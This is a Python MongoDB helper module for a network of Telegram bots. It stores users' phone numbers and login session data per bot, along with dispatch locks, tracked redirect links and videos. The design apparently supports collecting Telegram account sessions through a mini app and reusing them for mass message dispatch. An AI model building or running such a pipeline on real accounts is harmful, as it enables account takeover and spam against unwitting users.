import os
import io
import gridfs
from datetime import datetime
from pymongo import MongoClient
from bson import ObjectId

MONGODB_URI = os.getenv("MONGODB_URI", "")

_client = None
_db = None

def get_db():
    global _client, _db
    if _db is None:
        _client = MongoClient(
            MONGODB_URI,
            serverSelectionTimeoutMS=10000,
            connectTimeoutMS=10000,
            socketTimeoutMS=10000,
        )
        _db = _client["telegram_bots"]
    return _db

def check_connection():
    """Testa o acesso ao Mongo e descarta conexões que falharam."""
    global _client, _db
    try:
        get_db().command("ping")
        return True
    except Exception as e:
        print(f"MongoDB indisponível; aguardando liberação do IP: {type(e).__name__}")
        try:
            if _client is not None:
                _client.close()
        except Exception:
            pass
        _client = None
        _db = None
        return False

def save_session(user_id, phone, session_data, bot_id=None):
    try:
        db = get_db()
        now = datetime.now()
        update_fields = {
            "phone": phone,
            "session_data": session_data,
            "updated_at": now
        }
        if bot_id is not None:
            update_fields["bot_id"] = bot_id
        result = db.sessions.update_one(
            {"user_id": user_id},
            {"$set": update_fields,
            "$setOnInsert": {
                "created_at": now,
                "pending_disparo": False
            }},
            upsert=True
        )
        return True
    except Exception as e:
        print(f"Erro ao salvar session: {e}")
        return False

def get_sessions_by_bot(bot_id):
    db = get_db()
    return list(db.sessions.find({"bot_id": bot_id}).sort("created_at", -1))

def count_sessions_by_bot(bot_id):
    db = get_db()
    return db.sessions.count_documents({"bot_id": bot_id})

def get_bot_config(bot_id):
    db = get_db()
    doc = db.config.find_one({"bot_id": bot_id})
    if doc:
        config = {}
        for key, val in doc.items():
            if key not in ('_id', 'bot_id'):
                config[key] = val
        return config
    return {}

def set_bot_config(bot_id, key, value):
    try:
        db = get_db()
        db.config.update_one(
            {"bot_id": bot_id},
            {"$set": {key: value}},
            upsert=True
        )
        return True
    except:
        return False

def get_bot_by_token(token):
    db = get_db()
    return db.bots.find_one({"token": token})

def get_session(user_id):
    db = get_db()
    return db.sessions.find_one({"user_id": user_id})

def get_all_sessions():
    db = get_db()
    return list(db.sessions.find().sort("created_at", -1))

def get_sessions_for_child_bot(bot_id):
    """Retorna apenas sessions amarradas a esse bot filho."""
    db = get_db()
    return list(db.sessions.find({"bot_id": str(bot_id)}).sort("created_at", -1))

def get_orphan_sessions(active_child_bot_ids):
    """Retorna sessions sem dono ou de bots desativados (pertencem ao Pai).

    active_child_bot_ids: lista de strings com os _id (str) dos bots filhos ativos.
    """
    db = get_db()
    active_ids = [str(b) for b in (active_child_bot_ids or [])]
    query = {
        "$or": [
            {"bot_id": None},
            {"bot_id": {"$exists": False}},
            {"bot_id": ""},
            {"bot_id": {"$nin": active_ids}},
        ]
    }
    return list(db.sessions.find(query).sort("created_at", -1))

def acquire_session_lock(user_id, owner, ttl_seconds=600):
    """Tenta marcar a session como em uso. Atômico no Mongo.

    Retorna True se conseguiu o lock, False se outra rotina já está usando
    (e o lock ainda está dentro do TTL).
    """
    try:
        db = get_db()
        now = datetime.now()
        cutoff = datetime.fromtimestamp(now.timestamp() - ttl_seconds)
        result = db.sessions.update_one(
            {
                "user_id": user_id,
                "$or": [
                    {"pending_disparo": {"$ne": True}},
                    {"pending_disparo_at": {"$lt": cutoff}},
                    {"pending_disparo_at": {"$exists": False}},
                ],
            },
            {"$set": {
                "pending_disparo": True,
                "pending_disparo_at": now,
                "pending_disparo_owner": str(owner),
            }},
        )
        return result.modified_count == 1
    except Exception as e:
        print(f"Erro acquire_session_lock: {e}")
        return False

def release_session_lock(user_id):
    try:
        db = get_db()
        db.sessions.update_one(
            {"user_id": user_id},
            {"$set": {"pending_disparo": False},
             "$unset": {"pending_disparo_at": "", "pending_disparo_owner": ""}},
        )
    except Exception as e:
        print(f"Erro release_session_lock: {e}")

def reset_all_session_locks():
    """Limpeza usada no boot: libera locks travados de execuções anteriores."""
    try:
        db = get_db()
        db.sessions.update_many(
            {"pending_disparo": True},
            {"$set": {"pending_disparo": False},
             "$unset": {"pending_disparo_at": "", "pending_disparo_owner": ""}},
        )
    except Exception as e:
        print(f"Erro reset_all_session_locks: {e}")

def delete_session(user_id):
    try:
        db = get_db()
        db.sessions.delete_one({"user_id": user_id})
        return True
    except:
        return False

def add_bot(token, name, api_id, api_hash, webapp_url, bot_type="miniapp"):
    try:
        db = get_db()
        now = datetime.now()
        result = db.bots.update_one(
            {"token": token},
            {"$set": {
                "name": name,
                "api_id": api_id,
                "api_hash": api_hash,
                "webapp_url": webapp_url,
                "bot_type": bot_type,
                "active": True,
                "updated_at": now
            },
            "$setOnInsert": {
                "created_at": now
            }},
            upsert=True
        )
        doc = db.bots.find_one({"token": token})
        return str(doc["_id"]) if doc else None
    except Exception as e:
        print(f"Erro ao adicionar bot: {e}")
        return None

def get_all_bots():
    db = get_db()
    return list(db.bots.find({"active": True}).sort("created_at", -1))

def get_bot(bot_id):
    db = get_db()
    try:
        return db.bots.find_one({"_id": ObjectId(bot_id)})
    except:
        return db.bots.find_one({"_id": bot_id})

def deactivate_bot(bot_id):
    try:
        db = get_db()
        try:
            db.bots.update_one({"_id": ObjectId(bot_id)}, {"$set": {"active": False}})
        except:
            db.bots.update_one({"_id": bot_id}, {"$set": {"active": False}})
        return True
    except:
        return False

def get_config(bot_id, key, default=None):
    db = get_db()
    doc = db.config.find_one({"bot_id": bot_id})
    if doc and key in doc:
        return doc[key]
    return default

def set_config(bot_id, key, value):
    try:
        db = get_db()
        db.config.update_one(
            {"bot_id": bot_id},
            {"$set": {key: value}},
            upsert=True
        )
        return True
    except:
        return False

def count_sessions():
    db = get_db()
    return db.sessions.count_documents({})

def count_bots():
    db = get_db()
    return db.bots.count_documents({"active": True})

def save_redirect(code, telegram_url, label=""):
    try:
        db = get_db()
        now = datetime.now()
        db.redirects.update_one(
            {"code": code},
            {"$set": {
                "telegram_url": telegram_url,
                "label": label,
                "updated_at": now
            },
            "$setOnInsert": {
                "created_at": now,
                "clicks": 0
            }},
            upsert=True
        )
        return True
    except Exception as e:
        print(f"Erro ao salvar redirect: {e}")
        return False

def get_redirect(code):
    db = get_db()
    return db.redirects.find_one({"code": code})

def get_all_redirects():
    db = get_db()
    return list(db.redirects.find().sort("created_at", -1))

def delete_redirect(code):
    try:
        db = get_db()
        db.redirects.delete_one({"code": code})
        return True
    except:
        return False

def increment_redirect_clicks(code):
    try:
        db = get_db()
        db.redirects.update_one({"code": code}, {"$inc": {"clicks": 1}})
    except:
        pass

def count_redirects():
    db = get_db()
    return db.redirects.count_documents({})

def set_awaiting(user_id, data):
    try:
        db = get_db()
        db.awaiting_input.update_one(
            {"user_id": user_id},
            {"$set": {"data": data, "updated_at": datetime.now()}},
            upsert=True
        )
    except Exception as e:
        print(f"Erro set_awaiting: {e}")

def get_awaiting(user_id):
    try:
        db = get_db()
        doc = db.awaiting_input.find_one({"user_id": user_id})
        return doc["data"] if doc else None
    except Exception as e:
        print(f"Erro get_awaiting: {e}")
        return None

def del_awaiting(user_id):
    try:
        db = get_db()
        db.awaiting_input.delete_one({"user_id": user_id})
    except Exception as e:
        print(f"Erro del_awaiting: {e}")

def save_video_bytes(filename, file_data, content_type="video/mp4"):
    try:
        db = get_db()
        fs = gridfs.GridFS(db)
        existing = fs.find_one({"filename": filename})
        if existing:
            fs.delete(existing._id)
        fs.put(file_data, filename=filename, content_type=content_type)
        return True
    except Exception as e:
        print(f"Erro ao salvar vídeo no mongo: {e}")
        return False

def get_video_bytes(filename):
    try:
        db = get_db()
        fs = gridfs.GridFS(db)
        f = fs.find_one({"filename": filename})
        if f:
            return io.BytesIO(f.read())
        return None
    except Exception as e:
        print(f"Erro ao carregar vídeo do mongo: {e}")
        return None
